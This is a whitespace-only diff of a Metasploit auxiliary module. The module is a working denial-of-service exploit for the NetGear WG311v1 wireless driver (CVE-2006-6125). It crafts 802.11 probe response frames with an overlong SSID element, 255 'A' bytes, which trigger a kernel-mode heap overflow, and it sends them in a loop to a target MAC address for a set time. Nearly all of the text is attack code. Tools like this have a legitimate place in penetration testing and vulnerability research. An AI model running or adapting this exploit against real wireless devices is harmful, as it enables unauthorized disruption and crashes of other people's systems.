@@ -9,92 +9,92 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Lorcon2
-	include Msf::Auxiliary::Dos
+  include Msf::Exploit::Lorcon2
+  include Msf::Auxiliary::Dos
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'NetGear WG311v1 Wireless Driver Long SSID Overflow',
-			'Description'    => %q{
-				This module exploits a buffer overflow in the NetGear WG311v1 wireless device
-				driver under Windows XP and 2000. A kernel-mode heap overflow occurs
-				when malformed probe response frame is received that contains a long SSID field
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'NetGear WG311v1 Wireless Driver Long SSID Overflow',
+      'Description'    => %q{
+        This module exploits a buffer overflow in the NetGear WG311v1 wireless device
+        driver under Windows XP and 2000. A kernel-mode heap overflow occurs
+        when malformed probe response frame is received that contains a long SSID field
 
-				This DoS was tested with version 2.3.1.10 of the WG311ND5.SYS driver and a
-				NetGear WG311v1 PCI card. A remote code execution module is also in development.
+        This DoS was tested with version 2.3.1.10 of the WG311ND5.SYS driver and a
+        NetGear WG311v1 PCI card. A remote code execution module is also in development.
 
-				This module depends on the Lorcon2 library and only works on the Linux platform
-				with a supported wireless card. Please see the Ruby Lorcon2 documentation
-				(external/ruby-lorcon/README) for more information.
-			},
-			'Author'         => [ 'Laurent Butti <0x9090 [at] gmail.com>' ], # initial discovery and metasploit module
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					['CVE', '2006-6125'],
-					['OSVDB', '30511'],
-					['URL', 'http://projects.info-pull.com/mokb/MOKB-22-11-2006.html'],
-					['URL', 'ftp://downloads.netgear.com/files/wg311_1_3.zip'],
-				]
-		))
-		register_options(
-			[
-				OptInt.new('RUNTIME', [ true, "The number of seconds to run the attack", 60]),
-				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
-			], self.class)
-	end
+        This module depends on the Lorcon2 library and only works on the Linux platform
+        with a supported wireless card. Please see the Ruby Lorcon2 documentation
+        (external/ruby-lorcon/README) for more information.
+      },
+      'Author'         => [ 'Laurent Butti <0x9090 [at] gmail.com>' ], # initial discovery and metasploit module
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2006-6125'],
+          ['OSVDB', '30511'],
+          ['URL', 'http://projects.info-pull.com/mokb/MOKB-22-11-2006.html'],
+          ['URL', 'ftp://downloads.netgear.com/files/wg311_1_3.zip'],
+        ]
+    ))
+    register_options(
+      [
+        OptInt.new('RUNTIME', [ true, "The number of seconds to run the attack", 60]),
+        OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
+      ], self.class)
+  end
 
-	def run
+  def run
 
-		open_wifi
+    open_wifi
 
-		stime = Time.now.to_i
-		rtime = datastore['RUNTIME'].to_i
-		count = 0
+    stime = Time.now.to_i
+    rtime = datastore['RUNTIME'].to_i
+    count = 0
 
-		print_status("Creating malicious probe response frame...")
+    print_status("Creating malicious probe response frame...")
 
-		frame = create_probe_response()
+    frame = create_probe_response()
 
-		print_status("Sending malicious probe response frames for #{datastore['RUNTIME']} seconds...")
+    print_status("Sending malicious probe response frames for #{datastore['RUNTIME']} seconds...")
 
-		while (stime + rtime > Time.now.to_i)
-			wifi.write(frame)
-			select(nil, nil, nil, 0.10) if (count % 100 == 0)
-			count += 1
-		end
+    while (stime + rtime > Time.now.to_i)
+      wifi.write(frame)
+      select(nil, nil, nil, 0.10) if (count % 100 == 0)
+      count += 1
+    end
 
-		print_status("Completed sending #{count} probe responses.")
-	end
+    print_status("Completed sending #{count} probe responses.")
+  end
 
-	def create_probe_response
-		bssid    = Rex::Text.rand_text(6)
-		seq      = [rand(255)].pack('n')
+  def create_probe_response
+    bssid    = Rex::Text.rand_text(6)
+    seq      = [rand(255)].pack('n')
 
-		frame =
-			"\x50" +                      # type/subtype
-			"\x00" +                      # flags
-			"\x00\x00" +                  # duration
-			eton(datastore['ADDR_DST']) + # dst
-			bssid +                       # src
-			bssid +                       # bssid
-			seq   +                       # seq
-			Rex::Text.rand_text(8) +      # timestamp value
-			"\x64\x00" + 	              # beacon interval
-			"\x01\x00" +	              # capabilities
+    frame =
+      "\x50" +                      # type/subtype
+      "\x00" +                      # flags
+      "\x00\x00" +                  # duration
+      eton(datastore['ADDR_DST']) + # dst
+      bssid +                       # src
+      bssid +                       # bssid
+      seq   +                       # seq
+      Rex::Text.rand_text(8) +      # timestamp value
+      "\x64\x00" + 	              # beacon interval
+      "\x01\x00" +	              # capabilities
 
-			# SSID IE overflow
-			"\x00" + "\xff" + ("\x41" * 255) +
+      # SSID IE overflow
+      "\x00" + "\xff" + ("\x41" * 255) +
 
-			# supported rates IE
-			"\x01" + "\x08" + "\x02\x04\x0b\x16\x0c\x18\x30\x48" +
+      # supported rates IE
+      "\x01" + "\x08" + "\x02\x04\x0b\x16\x0c\x18\x30\x48" +
 
-			# channel IE
-			"\x03" + "\x01" + channel.chr
+      # channel IE
+      "\x03" + "\x01" + channel.chr
 
-		return frame
+    return frame
 
-	end
+  end
 end
 
 =begin
